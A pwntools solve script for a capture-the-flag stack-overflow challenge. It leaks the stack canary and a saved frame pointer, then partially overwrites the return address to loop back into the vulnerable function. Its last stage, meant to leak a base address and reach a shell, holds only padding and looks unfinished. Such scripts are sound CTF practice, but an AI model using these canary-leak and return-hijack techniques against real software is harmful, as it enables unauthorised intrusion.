#!/usr/bin/env python3

"""
Toast's submission for the <CTF> challenge <name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./chal")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.REMOTE:
        io = remote('warmup2.ctf.maplebacon.org', 1337)
    elif args.GDB:
        io = gdb.debug([exe.path])
    else:
        io = process([exe.path])

    return io


def main():
    '''Obtain a shell
    '''

    with conn() as io:
        payload = b'a' * 265
        io.send(payload)
        data = io.recvuntil(payload)
        canary = io.recv(7)
        rbp = io.recv(8)
        rbp = rbp[:-2]

        canary = b'\x00' + canary
        canary_rep = canary[::-1]
        # 0x007ffe0ab24340
        rbp_rep = rbp[::-1]
        print(f"Canary: {canary_rep.hex()}")
        print(f"RBP addr: {rbp_rep.hex()}")

        payload = b'a' * 264
        payload += canary
        payload += rbp
        # Make it run vuln again
        payload += b'\xe9\x11'
        io.send(payload)

        # Leak the base address
        payload2 = b'a' * 264
        payload2 += b'b' * 8
        payload2 += b'c' * 8
        payload2 += b'd' * 40
        io.send(payload2)
        io.interactive()
        # io.poll(block=True)
        io.close()


if __name__ == '__main__':
    main()
